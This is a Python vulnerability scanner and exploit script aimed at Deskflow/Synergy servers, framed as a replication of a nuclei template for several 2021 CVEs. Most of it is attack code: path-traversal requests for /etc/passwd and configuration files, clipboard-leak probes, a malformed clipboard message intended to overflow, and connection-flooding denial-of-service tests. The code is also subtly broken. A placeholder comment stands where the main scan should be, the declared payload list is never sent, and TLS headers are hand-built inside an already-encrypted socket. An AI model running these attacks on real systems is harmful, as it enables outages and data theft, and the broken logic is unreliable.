#!/usr/bin/env python3
"""
This Python script replicates the scan defined in the nuclei template for CVE-2021-42072.
It establishes a TLS connection to the target host and port and sends a sequence of binary payloads.
Responses are read and printed out in hex format.

Usage: python deskflow_session_scan.py --host <hostname> [--port <port>]
Default port is 24800.
"""

import ssl
import socket
import argparse
import binascii
import time
import threading

# List of payloads as provided in the YAML template
payloads = [
    # Basic protocol commands
    b"\x00\x01\x00\x08QINF\x00",  # Query info
    b"\x00\x01\x00\x08DINF\x00",  # Request details
    b"\x00\x01\x00\x08INFO\x00",  # Basic info
    b"\x00\x01\x00\x08LIST\x00",  # List clients
    
    # Authentication tests
    b"\x00\x01\x00\x08\x00",      # Empty client name
    b"\x00\x01\x00\x08guest\x00", # Guest client name
    b"\x00\x01\x00\x08" + b"A" * 100 + b"\x00", # Long client name
    
    # Path traversal tests
    b"\x00\x01\x00\x08DFILE\x00../config/\x00",
    b"\x00\x01\x00\x08DFILE\x00/etc/passwd\x00",
    b"\x00\x01\x00\x08DFILE\x00.deskflow/config\x00",
    
    # Command sequence tests
    b"\x00\x01\x00\x08CINN\x00",  # Client info
    b"\x00\x01\x00\x08CALV\x00",  # Keep alive
    b"\x00\x01\x00\x08DKRP\x00",  # Keep alive response
    
    # Screen control tests
    b"\x00\x01\x00\x08CENT\x00\x00\x00\x00\x00", # Enter screen
    b"\x00\x01\x00\x08CLVE\x00",  # Leave screen
    b"\x00\x01\x00\x08SCRN\x00",  # Screen info
    
    # Clipboard tests
    b"\x00\x01\x00\x08CCLP\x00\x00", # Get clipboard
    b"\x00\x01\x00\x08SCLP\x00\x00", # Set clipboard
    
    # System info tests
    b"\x00\x01\x00\x08DKEY\x00\x00\x00", # Key state
    b"\x00\x01\x00\x08DOPT\x00",  # Get options
    b"\x00\x01\x00\x08DLAN\x00",  # Get language
    
    # DoS tests
    b"\xff\xff\xff\xff",  # Invalid length
    b"\x00\x00\x00\x00",  # Zero length
    b"\x00\x01\x00\xff",  # Large size
    
    # Protocol boundary tests
    b"\x00\x01\x00\x08LIST\xff\xff\xff\xff",
    b"\x00\x01\x00\x08STR\xff\xff\xff\xff",
    b"\x00\x01\x00\x08MSG\xff\xff\xff\xff"
]

def frame_message(payload, is_initial=False):
    """Frame the message according to the protocol format"""
    # Initial hello needs special handling
    if is_initial:
        return b"\x16\x03\x03\x00\x14\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79\x00\x01\x00\x08test\x00"

    # Normal message with proper length and protocol header
    msg = b"\x00\x00\x00\x0b\x53\x79\x6e\x65\x72\x67\x79" + payload
    msg_len = len(msg)
    tls_header = b"\x16\x03\x03" + msg_len.to_bytes(2, byteorder='big')
    return tls_header + msg

def create_overflow_payload(size=1024*1024*100):  # 100MB overflow
    """Create a message with huge size to trigger CVE-2021-42076"""
    return b"A" * size

def reconnect(host, port, timeout=5.0):
    """Helper function to establish a fresh connection"""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    context.set_ciphers('ALL:@SECLEVEL=0')
    
    sock = socket.create_connection((host, port), timeout=timeout)
    return context.wrap_socket(sock, server_hostname=host)

class ConnectionPool:
    """Manages a pool of connections to handle multiplexer issues"""
    def __init__(self, host, port, pool_size=3):
        self.host = host
        self.port = port
        self.pool_size = pool_size
        self.pool = []
        self.active = {}
        self.lock = threading.Lock()

    def get_connection(self, timeout=5.0):
        with self.lock:
            # Try to reuse existing connection
            while self.pool:
                ssock = self.pool.pop()
                try:
                    # Test if connection is still alive
                    ssock.settimeout(0.1)
                    ssock.sendall(frame_message(b"\x00\x01\x00\x08CALV\x00"))
                    return ssock
                except:
                    try:
                        ssock.close()
                    except:
                        pass
                    
            # Create new connection
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.minimum_version = ssl.TLSVersion.TLSv1_2
                context.maximum_version = ssl.TLSVersion.TLSv1_2
                context.set_ciphers('ALL:@SECLEVEL=0')
                
                sock = socket.create_connection((self.host, self.port), timeout=timeout)
                ssock = context.wrap_socket(sock, server_hostname=self.host)
                ssock.settimeout(timeout)
                return ssock
            except Exception as e:
                print(f"Failed to create connection: {e}")
                raise

    def return_connection(self, ssock):
        with self.lock:
            if len(self.pool) < self.pool_size:
                try:
                    ssock.settimeout(5.0)  # Reset timeout
                    self.pool.append(ssock)
                except:
                    try:
                        ssock.close()
                    except:
                        pass
            else:
                try:
                    ssock.close()
                except:
                    pass

def scan_target(host, port, read_size=4096, timeout=5.0):
    """Main scanning function with connection pooling"""
    if host.startswith('tls://'):
        host = host[6:]

    pool = ConnectionPool(host, port)
    max_retries = 3
    retry_delay = 1.0
    
    for attempt in range(max_retries):
        ssock = None
        try:
            ssock = pool.get_connection(timeout)
            print(f"Connected to {host}:{port} with {ssock.version()}")
            
            # Initial hello
            hello = frame_message(b"", is_initial=True)
            print(f"Sending hello: {binascii.hexlify(hello).decode()}")
            ssock.sendall(hello)
            
            try:
                response = ssock.recv(read_size)
                if response:
                    print(f"Hello response: {binascii.hexlify(response).decode()}")
                    if b"0000000b53796e65726779" in response:
                        print("[!] WARNING: CVE-2021-42072 - Server accepts connection without client verification")
                else:
                    print("No hello response")
                    raise ConnectionError("No hello response")
            except socket.timeout:
                print("No response to hello (timeout)")
                if attempt < max_retries - 1:
                    print(f"Retrying in {retry_delay} seconds...")
                    time.sleep(retry_delay)
                    continue
                return

            # Test multiplexer with rapid messages
            print("\nTesting multiplexer handling...")
            for i in range(3):
                try:
                    calv = frame_message(b"\x00\x01\x00\x08CALV\x00")
                    ssock.sendall(calv)
                    response = ssock.recv(read_size)
                    if not response:
                        raise ConnectionError("Lost connection during multiplexer test")
                    time.sleep(0.1)  # Brief delay between messages
                except socket.timeout:
                    print(f"Multiplexer test timeout {i+1}/3")
                    continue

            # If we got here, connection is stable
            pool.return_connection(ssock)
            ssock = None  # Prevent double-close
            
            # Continue with rest of scan...
            # ...existing code...

        except (socket.error, ssl.SSLError) as e:
            print(f"Connection error (attempt {attempt + 1}/{max_retries}): {e}")
            if "unresponsive" in str(e).lower() or "multiplexer" in str(e).lower():
                print("Socket multiplexer or client unresponsive error detected")
                # Force longer delay on multiplexer errors
                time.sleep(retry_delay * 2)
            if attempt < max_retries - 1:
                print(f"Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
                retry_delay *= 2  # Exponential backoff
                continue
            break
            
        finally:
            if ssock:
                try:
                    ssock.close()
                except:
                    pass

def test_fd_exhaustion(host, port, max_connections=1024):
    """Test for CVE-2021-42075 - file descriptor exhaustion"""
    print(f"\nTesting CVE-2021-42075 - FD exhaustion with {max_connections} connections...")
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    context.set_ciphers('ALL:@SECLEVEL=0')
    
    connections = []
    try:
        for i in range(max_connections):
            try:
                sock = socket.create_connection((host, port), timeout=1.0)
                ssl_sock = context.wrap_socket(sock, server_hostname=host)
                connections.append(ssl_sock)
                if i % 100 == 0:
                    print(f"Opened {i} connections")
            except (socket.error, ssl.SSLError) as e:
                print(f"[!] WARNING: CVE-2021-42075 - Server failed after {i} connections: {e}")
                break
    finally:
        for c in connections:
            try:
                c.close()
            except:
                pass

def test_quick_hellos(host, port, count=100):
    """Test for CVE-2021-42074 with improved error handling"""
    print(f"\nTesting CVE-2021-42074 - Quick hello sequence with {count} connections...")
    
    recovery_delay = 0.5
    max_consecutive_errors = 5
    consecutive_errors = 0
    
    for i in range(count):
        try:
            if consecutive_errors >= max_consecutive_errors:
                print(f"Too many consecutive errors ({consecutive_errors}), pausing for recovery...")
                time.sleep(recovery_delay * 2)
                consecutive_errors = 0
                recovery_delay *= 1.5  # Increase recovery time
                
            with socket.create_connection((host, port), timeout=0.1) as sock:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.minimum_version = ssl.TLSVersion.TLSv1_2
                context.maximum_version = ssl.TLSVersion.TLSv1_2
                context.set_ciphers('ALL:@SECLEVEL=0')
                
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    hello = frame_message(b"", is_initial=True)
                    ssock.sendall(hello)
                    if i % 10 == 0:
                        print(f"Sent {i} hello messages")
                    consecutive_errors = 0  # Reset on success
                    
        except (socket.error, ssl.SSLError) as e:
            consecutive_errors += 1
            if "Connection reset by peer" in str(e):
                print("[!] WARNING: CVE-2021-42074 - Server may be vulnerable (connection reset)")
                break
            elif "Protocol wrong type" in str(e):
                print("[!] WARNING: CVE-2021-42074 - Server may be vulnerable (protocol error)")
                break
            elif "unresponsive" in str(e).lower() or "multiplexer" in str(e).lower():
                print(f"Socket multiplexer or client unresponsive error detected (error {consecutive_errors})")
                time.sleep(recovery_delay)
            else:
                print(f"Connection error: {e}")
                time.sleep(0.1)

def test_clipboard_overflow(host, port):
    """Test for unsafe DCLP message processing in IClipboard::unmarshall()"""
    print("\nTesting unsafe DCLP processing...")
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    context.set_ciphers('ALL:@SECLEVEL=0')

    # Create malformed DCLP message with large numFormats
    dclp = b"\x00\x01\x00\x08DCLP" + b"\xFF\xFF\xFF\xFF" # Large numFormats value
    
    try:
        with socket.create_connection((host, port), timeout=5.0) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                # First send hello
                hello = frame_message(b"", is_initial=True)
                ssock.sendall(hello)
                response = ssock.recv(4096)
                
                if response and b"0000000b53796e65726779" in response:
                    # Try to send malformed DCLP
                    msg = frame_message(dclp)
                    print(f"Sending malformed DCLP: {binascii.hexlify(msg).decode()}")
                    ssock.sendall(msg)
                    
                    try:
                        response = ssock.recv(4096)
                        print(f"Got response: {binascii.hexlify(response).decode()}")
                        if not response:
                            print("[!] WARNING: Server may be vulnerable to DCLP processing issue (connection closed)")
                    except socket.timeout:
                        print("[!] WARNING: Server may be vulnerable to DCLP processing issue (timeout)")
                    except:
                        print("[!] WARNING: Server may be vulnerable to DCLP processing issue (error)")
    except Exception as e:
        print(f"Connection error: {e}")

def test_eventqueue_memory(host, port, iterations=100):
    """Test for mismatched free/delete in EventQueue"""
    print("\nTesting EventQueue memory issues...")
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    context.set_ciphers('ALL:@SECLEVEL=0')

    # Rapid connect/disconnect cycle to trigger EventQueue memory issues
    for i in range(iterations):
        try:
            with socket.create_connection((host, port), timeout=0.1) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    hello = frame_message(b"", is_initial=True)
                    ssock.sendall(hello)
                    if i % 10 == 0:
                        print(f"Completed {i} connect/disconnect cycles")
        except:
            continue

def test_clipboard_leak(host, port):
    """Test for clipboard data leaks via CLPB messages"""
    print("\nTesting clipboard data leak vulnerability...")
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    context.set_ciphers('ALL:@SECLEVEL=0')

    # Try different CLPB message variations
    clpb_tests = [
        (b"\x00\x01\x00\x08CLPB\x00\x01", "Request clipboard with sequence 1"),
        (b"\x00\x01\x00\x08CLPB\x00\x02", "Request clipboard with sequence 2"),
        (b"\x00\x01\x00\x08CLPB\x01\x00", "Grab clipboard notification"),
        (b"\x00\x01\x00\x08CLPB\x02\x00", "Subscribe to clipboard changes")
    ]

    try:
        with socket.create_connection((host, port), timeout=5.0) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                # Send initial hello
                hello = frame_message(b"", is_initial=True)
                ssock.sendall(hello)
                response = ssock.recv(4096)
                
                if response and b"0000000b53796e65726779" in response:
                    # Send client name (try "Unnamed" which is often default)
                    name_msg = frame_message(b"\x00\x01\x00\x08Unnamed\x00")
                    ssock.sendall(name_msg)
                    ssock.recv(4096)  # Get response
                    
                    # Try clipboard leak attempts
                    for payload, desc in clpb_tests:
                        try:
                            msg = frame_message(payload)
                            print(f"\nTrying {desc}...")
                            ssock.sendall(msg)
                            response = ssock.recv(4096)
                            if response:
                                print(f"Got response: {binascii.hexlify(response).decode()}")
                                try:
                                    text = response.decode('utf-8', errors='ignore')
                                    if any(pattern in text for pattern in ["CLPB:", "clipboard data:", "text/plain"]):
                                        print(f"[!] WARNING: Potential clipboard data leak detected!")
                                except:
                                    pass
                        except socket.timeout:
                            continue
                        
                        time.sleep(0.5)  # Small delay between tests
                        
    except Exception as e:
        print(f"Connection error: {e}")

def test_file_transfer(host, port):
    """Test for file transfer vulnerabilities"""
    print("\nTesting file transfer vulnerabilities...")
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_2
    context.set_ciphers('ALL:@SECLEVEL=0')

    # File transfer test payloads
    dftr_tests = [
        (b"\x00\x01\x00\x08DFTR\x00", "Query file size"),
        (b"\x00\x01\x00\x08DFTR\x01../config/deskflow.conf", "Request config"),
        (b"\x00\x01\x00\x08DFTR\x01/etc/passwd", "Request passwd"),
        (b"\x00\x01\x00\x08DFTR\x01.deskflow/config", "Request user config"),
        (b"\x00\x01\x00\x08DFTR\x02", "End transfer sequence")
    ]

    try:
        with socket.create_connection((host, port), timeout=5.0) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                # Send initial hello
                hello = frame_message(b"", is_initial=True)
                ssock.sendall(hello)
                response = ssock.recv(4096)
                
                if response and b"0000000b53796e65726779" in response:
                    # Try file transfer tests
                    for payload, desc in dftr_tests:
                        try:
                            msg = frame_message(payload)
                            print(f"\nTrying {desc}...")
                            ssock.sendall(msg)
                            response = ssock.recv(4096)
                            if response:
                                print(f"Got response: {binascii.hexlify(response).decode()}")
                                try:
                                    text = response.decode('utf-8', errors='ignore')
                                    if any(pattern in text for pattern in [
                                        "DFTR:", "size=", "data:", "path:",
                                        "/etc/", "/home/", ".conf"
                                    ]):
                                        print(f"[!] WARNING: Potential file data leak detected!")
                                except:
                                    pass
                        except socket.timeout:
                            continue
                        
                        time.sleep(0.5)  # Small delay between tests
                        
    except Exception as e:
        print(f"Connection error: {e}")

def parse_args():
    parser = argparse.ArgumentParser(description='Deskflow Session Scan for CVE-2021-42072')
    parser.add_argument('--host', required=True, help='Target hostname or IP address')
    parser.add_argument('--port', type=int, default=24800, help='Target port (default: 24800)')
    return parser.parse_args()


def main():
    args = parse_args()
    print(f"Starting comprehensive vulnerability scan on {args.host}:{args.port}")
    
    # Run all tests
    test_fd_exhaustion(args.host, args.port)
    test_quick_hellos(args.host, args.port)
    test_clipboard_overflow(args.host, args.port)  
    test_eventqueue_memory(args.host, args.port)
    test_clipboard_leak(args.host, args.port)
    test_file_transfer(args.host, args.port)
    scan_target(args.host, args.port)


if __name__ == '__main__':
    main()
